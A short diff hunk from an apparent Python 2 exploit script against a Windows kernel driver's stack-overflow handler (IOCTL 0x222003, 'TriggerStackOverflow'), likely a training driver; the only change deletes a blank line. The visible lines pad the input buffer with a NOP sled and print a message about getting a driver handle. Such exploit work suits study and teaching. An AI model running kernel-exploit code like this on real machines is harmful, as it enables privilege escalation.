@@ -369,7 +369,6 @@ input_buffer += "\x90" * (4000 - len(input_buffer))
 
 input_buffer_length = len(input_buffer)
 
-
 # 0x222003 = IOCTL code that will jump to TriggerStackOverflow() function
 # Getting handle to driver to return to DeviceIoControl() function
 print "[+] Using CreateFileA() to obtain and return handle referencing the driver..."
